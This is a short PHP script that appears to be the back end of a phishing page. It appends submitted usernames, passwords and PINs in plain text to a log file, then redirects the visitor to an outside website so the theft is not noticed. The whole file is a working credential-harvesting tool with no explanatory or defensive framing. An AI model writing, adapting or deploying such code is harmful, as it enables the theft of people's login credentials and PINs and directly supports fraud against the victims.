<?php

    file_put_contents("log.txt", "Username: " . $_POST['username'] . "\n" ." Pass: " . $_POST['password'] . "\n Pin: " . $_POST['pin'] . "\n", FILE_APPEND);
header('Location: https://skweezer.net');
exit();
